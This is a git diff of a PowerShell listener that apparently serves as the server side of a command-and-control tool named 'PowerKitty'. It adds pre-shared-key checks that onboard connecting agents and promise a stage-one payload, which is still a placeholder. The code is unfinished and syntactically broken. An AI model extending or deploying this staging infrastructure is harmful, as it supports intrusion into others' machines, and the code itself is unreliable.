@@ -12,7 +12,10 @@ Function Global:New-Listerner()
 		[system.net.ipaddress]$LHOST = [system.net.ipaddress]::Loopback,
 
 		[Parameter()]
-		[short]$LPORT
+		[short]$LPORT,
+
+		[Parameter()]
+		[String]$PSK
 	)
 
 	# If global lister object doesnt exist,or is null - create one
@@ -46,41 +49,50 @@ Function Global:New-Listerner()
 	# continue accepting socket connections until object no longer exists
 	while(Get-Listerner -UUID ($obj.UUID))
 	{
-		"1"
 		
 		if($client = $listener.AcceptTcpClient())
 		{
 
 			# add agent to listerner
-			$thisListerner = Get-Listerner -UUID ($obj.UUID.toString())
-			$agentCount    = $thisListerner.AGENTCOUNT++
-			$agents        = $thisListerner.RAWAGENT += $client
+			#$thisListerner = Get-Listerner -UUID ($obj.UUID.toString())
+			#$agentCount    = $thisListerner.AGENTCOUNT++
+			#$agents        = $thisListerner.RAWAGENT += $client
 			# make this work from pipeline: (get lister | set listerner)
-			Set-Listerner -RAWAGENT $agents -AGENTCOUNT $agentCount -UUID $obj.UUID
+			#Set-Listerner -RAWAGENT $agents -AGENTCOUNT $agentCount -UUID $obj.UUID
 		    
 			# upgrade agent (maybe auth - tty etc)
-			$Stream = $client.GetStream()
-			$StreamWriter = New-Object System.IO.StreamWriter($Stream)
-			$StreamWriter.WriteLine("TEST") | Out-Null
-			$StreamWriter.Close()
-
-
+			
 			# build a runspace
 			$Runspace            = [runspacefactory]::CreateRunspace()
 			$PowerShell          = [powershell]::Create()
 			$PowerShell.runspace = $Runspace
 			$Runspace.Open()
+
+			# build our logic for  onboarding connections
 			[void]$PowerShell.AddScript({
-			
+				$Stream = $client.GetStream()
+				$StreamWriter = New-Object System.IO.StreamWriter($Stream)
+				$StreamReader = New-Object System.IO.StreamReader($Stream)
+
+				if($StreamReader.ReadLine() == "Onboard:$PSK"){
+					$StreamWriter.WriteLine("Purr! Welcome to stage one, here is your payload: <TODO>") | Out-Null
+				}else if($StreamReader.ReadLine() == "PowerKitty-Agent:$PSK"){
+					$StreamWriter.WriteLine("Purrrrr! Adding you to connection list! :) ") | Out-Null
+				} else{
+					# this is not a verified powerkitty connection
+					$StreamWriter.WriteLine("HISSS! >.<") | Out-Null
+				}
+				
+				# test stuff
+				$StreamWriter.Close()
 
 			})
-			$AsyncObject = $PowerShell.BeginInvoke()
+			$AsyncObject = $PowerShell.BeginInvoke($client)
 			"sock!"
 		}
 		
 		# small sleep to not thrash CPU
 	    Start-Sleep -Milliseconds 100
-		"4"
 		
 	}
 	$listener.Stop();
